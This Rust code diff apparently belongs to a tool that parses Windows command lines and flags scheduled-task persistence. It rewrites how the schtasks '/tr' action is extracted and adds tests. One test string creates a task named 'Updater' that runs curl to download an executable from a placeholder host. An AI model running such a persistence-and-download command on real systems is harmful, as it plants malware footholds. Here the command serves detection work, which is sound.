@@ -130,11 +130,7 @@ pub fn h_schtasks(raw: &str, env: &mut Environment) {
         return;
     }
     let task_name = flag_value(raw, "/tn").unwrap_or_default();
-    let task_run = flag_value_separated(raw, "/tr")
-        .or_else(|| {
-            flag_value_attached(raw, "/tr")
-                .filter(|command| persisted_command_looks_dispatchable(command))
-        })
+    let task_run = schtasks_task_run(raw)
         .or_else(|| flag_value_separated(raw, "/xml").map(|path| format!("xml:{path}")))
         .unwrap_or_default();
     env.traits.push(Trait::Persistence {
@@ -144,6 +140,89 @@ pub fn h_schtasks(raw: &str, env: &mut Environment) {
         command: task_run.clone(),
     });
     queue_registry_persisted_command(task_run, env);
+}
+
+fn schtasks_task_run(raw: &str) -> Option<String> {
+    let spans = split_word_spans(raw);
+    for (idx, span) in spans.iter().enumerate() {
+        let raw_token = &raw[span.clone()];
+        let normalized_token = raw_token.trim_matches(['"', '\'']);
+        if normalized_token.eq_ignore_ascii_case("/tr") {
+            let value_span = spans.get(idx + 1)?;
+            let value_start = value_span.start;
+            let value = raw[value_start..].trim_start();
+            if value.starts_with(['"', '\'']) {
+                return parse_flag_value(raw, value_start);
+            }
+            let value_end = schtasks_unquoted_value_end(raw, &spans[idx + 1..]);
+            return Some(raw[value_start..value_end].trim_end().to_string());
+        }
+        if let Some(rest) = raw_token
+            .strip_prefix("/tr:")
+            .or_else(|| raw_token.strip_prefix("/tr="))
+            .or_else(|| raw_token.strip_prefix("/TR:"))
+            .or_else(|| raw_token.strip_prefix("/TR="))
+        {
+            if rest.is_empty() {
+                continue;
+            }
+            return parse_flag_value(raw, span.end - rest.len())
+                .filter(|command| persisted_command_looks_dispatchable(command));
+        }
+    }
+    None
+}
+
+fn schtasks_unquoted_value_end(raw: &str, value_spans: &[std::ops::Range<usize>]) -> usize {
+    for span in value_spans.iter().skip(1) {
+        let token = raw[span.clone()].trim_matches(['"', '\'']);
+        if schtasks_option_token(token) {
+            return span.start;
+        }
+    }
+    value_spans.last().map_or(raw.len(), |span| span.end)
+}
+
+fn schtasks_option_token(token: &str) -> bool {
+    matches!(
+        token.to_ascii_lowercase().as_str(),
+        "/create"
+            | "/change"
+            | "/delete"
+            | "/query"
+            | "/run"
+            | "/end"
+            | "/tn"
+            | "/sc"
+            | "/mo"
+            | "/d"
+            | "/m"
+            | "/i"
+            | "/st"
+            | "/ri"
+            | "/et"
+            | "/du"
+            | "/k"
+            | "/sd"
+            | "/ed"
+            | "/ec"
+            | "/it"
+            | "/np"
+            | "/z"
+            | "/f"
+            | "/ru"
+            | "/rp"
+            | "/rl"
+            | "/delay"
+            | "/hresult"
+            | "/xml"
+            | "/v"
+            | "/fo"
+            | "/nh"
+            | "/s"
+            | "/u"
+            | "/p"
+    )
 }
 
 fn flag_value(raw: &str, flag: &str) -> Option<String> {
@@ -201,30 +280,6 @@ fn flag_value_separated(raw: &str, flag: &str) -> Option<String> {
                 i += 1;
             }
             return parse_flag_value(raw, i);
-        }
-        i = next_arg_start(raw, i);
-    }
-    None
-}
-
-fn flag_value_attached(raw: &str, flag: &str) -> Option<String> {
-    let mut i = 0usize;
-    let bytes = raw.as_bytes();
-    while i < raw.len() {
-        while bytes.get(i).is_some_and(u8::is_ascii_whitespace) {
-            i += 1;
-        }
-        if i >= raw.len() {
-            break;
-        }
-        if raw[i..]
-            .get(..flag.len())
-            .is_some_and(|candidate| candidate.eq_ignore_ascii_case(flag))
-        {
-            let value_start = i + flag.len();
-            if matches!(bytes.get(value_start), Some(b':') | Some(b'=')) {
-                return parse_flag_value(raw, value_start + 1);
-            }
         }
         i = next_arg_start(raw, i);
     }
@@ -470,7 +525,7 @@ make_handler!(h_whoami, "whoami");
 mod tests {
     use super::{
         at_scheduled_command, h_reg, h_schtasks, persisted_command_child, sc_failure_command,
-        sc_service_binpath,
+        sc_service_binpath, schtasks_task_run,
     };
     use crate::env::{Config, Environment};
     use crate::traits::Trait;
@@ -572,6 +627,28 @@ mod tests {
 
         assert_eq!(child, "echo !USERPROFILE!");
         assert!(delayed);
+    }
+
+    #[test]
+    fn schtasks_task_run_collects_unquoted_command_until_next_task_option() {
+        let command = schtasks_task_run(
+            r#"schtasks /create /tn Updater /tr cmd.exe /c curl -o out.exe https://example.test/p.exe /sc once /st 00:00"#,
+        )
+        .expect("task action should parse");
+
+        assert_eq!(
+            command,
+            "cmd.exe /c curl -o out.exe https://example.test/p.exe"
+        );
+    }
+
+    #[test]
+    fn schtasks_task_run_preserves_quoted_command() {
+        let command =
+            schtasks_task_run(r#"schtasks /create /tn Updater /tr "cmd.exe /c echo hi" /sc once"#)
+                .expect("quoted task action should parse");
+
+        assert_eq!(command, "cmd.exe /c echo hi");
     }
 
     #[test]
